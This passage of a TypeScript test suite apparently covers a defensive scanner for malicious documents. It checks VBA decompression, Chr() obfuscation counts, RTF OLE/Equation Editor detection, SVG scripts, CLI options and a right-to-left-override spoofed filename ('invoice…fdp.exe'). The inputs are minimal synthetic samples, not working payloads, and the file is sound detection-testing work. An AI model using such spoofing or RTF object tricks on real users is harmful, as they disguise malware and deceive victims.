    const out = ovbaDecompress(Uint8Array.from(body));
    expect(out.length).toBeGreaterThan(0);

    // uncompressed chunk path
    const unc = Buffer.alloc(3 + 4096);
    unc[0] = 1;
    unc.writeUInt16LE(0x0fff, 1); // size, not compressed
    Buffer.from("hello").copy(unc, 3);
    expect(Buffer.from(ovbaDecompress(new Uint8Array(unc))).toString().startsWith("hello")).toBe(true);

    // parseDir unicode names + PROJECTVERSION
    const parts: number[] = [];
    const push = (id: number, data: Uint8Array) => {
      const h = Buffer.alloc(6);
      h.writeUInt16LE(id, 0);
      h.writeUInt32LE(id === 0x0009 ? 4 : data.length, 2);
      parts.push(...h, ...data);
    };
    push(0x0003, Buffer.from([0xe9, 0x03])); // 1001 → windows-1252 fallback? 1001 not in range
    push(0x0009, Buffer.from([1, 0, 0, 0, 0, 0]));
    push(0x0019, Buffer.from("Mod"));
    push(0x0047, Buffer.from("M\0o\0d\0U\0", "binary"));
    push(0x0032, Buffer.from("S\0t\0r\0e\0a\0m\0", "binary"));
    push(0x0031, Buffer.from([0, 0, 0, 0]));
    const dir = parseDir(Uint8Array.from(parts));
    expect(dir.modules.length).toBe(1);

    for (const cp of [65001, 932, 936, 949, 950, 1252, 874, 10000, 9999]) expect(codepageLabel(cp)).toBeTruthy();

    const manyChr = Array.from({ length: CHR_OBFUSCATION_THRESHOLD + 5 }, (_, i) => `a=Chr(${i})`).join("\n");
    expect(analyzeVba(`Sub X()\n${manyChr}\nEnd Sub`).chrCalls).toBeGreaterThan(CHR_OBFUSCATION_THRESHOLD);
    expect(stripComments(`Sub X() ' trail\nRem hi\nAttribute VB_Name="X"\n"it's" & "'"`)).toContain("it's");

    // RTF \\bin, objupdate, obfuscation garbage, hex escapes
    const rtfBin = enc("{\\rtf1\\ansi{\\object\\objupdate\\objemb{\\*\\objclass Equation.3}{\\*\\objdata \\'4d\\'5a \\bin2 XX junkjunk}}}");
    expect(ids(scanSync(rtfBin, { filename: "e.rtf" })).some((id) => id === "RTF_OLE_OBJECT" || id === "RTF_OBJUPDATE" || id === "OLE_EQUATION_EDITOR" || id === "RTF_OBFUSCATION")).toBe(true);

    const rtfObf = enc("{\\rtf1\\ansi{\\object{\\*\\objdata " + "ZZ".repeat(20) + "}}}");
    expect(ids(scanSync(rtfObf, { filename: "o.rtf" }))).toContain("RTF_OBFUSCATION");
  });
});

describe("CLI edge coverage", () => {
  it("covers -- severity= form, --, stdin name/mime, max-bytes, truncated, json errors", async () => {
    expect(() => parseArgs(["--fail-on=nope"])).toThrow(/must be one of/);
    expect(() => parseArgs(["--severity", "SVG_SCRIPT"])).toThrow(/expects RULE_ID/);
    expect(() => parseArgs(["--severity=SVG_SCRIPT=nope"])).toThrow(/must be one of/);
    expect(() => parseArgs(["--max-bytes", "0"])).toThrow(/positive/);
    expect(() => parseArgs(["--max-bytes"])).toThrow(/needs a value/);
    const p = parseArgs(["--severity=SVG_SCRIPT=high", "--name=a.svg", "--mime=image/svg+xml", "--max-bytes=1000", "--", "-v", "-"]);
    expect(p.files).toContain("-v");
    expect(p.severity.SVG_SCRIPT).toBe("high");
    expect(p.name).toBe("a.svg");

    const clean = enc('<svg xmlns="http://www.w3.org/2000/svg"/>');
    const files: Record<string, Uint8Array> = { "-": clean, "a.svg": clean };
    const state = { out: "", err: "" };
    const io = {
      async readFile(path: string, max: number) {
        const b = files[path];
        if (!b) throw new Error("ENOENT");
        return b.subarray(0, max);
      },
      async readStdin(max: number) {
        return files["-"]!.subarray(0, max);
      },
      async stdout(t: string) {
        state.out += t;
      },
      stderr(t: string) {
        state.err += t;
      },
    };
    expect(await main(["-", "--name", "x.svg", "--mime", "image/svg+xml", "--json"], io)).toBe(0);
    expect(await main([], io)).toBe(2);
    expect(await main(["--severity=SVG_SCRIPT=low", "a.svg"], io)).toBe(0);
    const r = scanSync(enc('<svg xmlns="http://www.w3.org/2000/svg"><script>x</script></svg>'), { filename: "a.svg" });
    // truncated note path
    const fake = { ...r, truncated: true, limitsHit: ["maxBytes"] };
    expect(formatReport("a.svg", fake)).toContain("not everything");
  });
});

describe("filename spoofing / misc bytes", () => {
  it("RTL override and double extension already in matrix; bytes helpers", () => {
    expect(ids(scanSync(enc("MZ"), { filename: "invoice\u202efdp.exe" }))).toContain("FILENAME_BIDI_CONTROL");
    expect(latin1(enc("ABCD"), 0, 4)).toBe("ABCD");
    expect(indexOfCI(enc("AbCd"), "bc")).toBe(1);
    expect(u16be(new Uint8Array([0x12, 0x34]), 0)).toBe(0x1234);
    expect(u32be(new Uint8Array([0, 0, 0, 1]), 0)).toBe(1);
    expect(lastIndexOf(enc("ababa"), enc("ba"))).toBe(3);
    expect(decode(enc("hi"), "utf-8")).toBe("hi");
  });
});
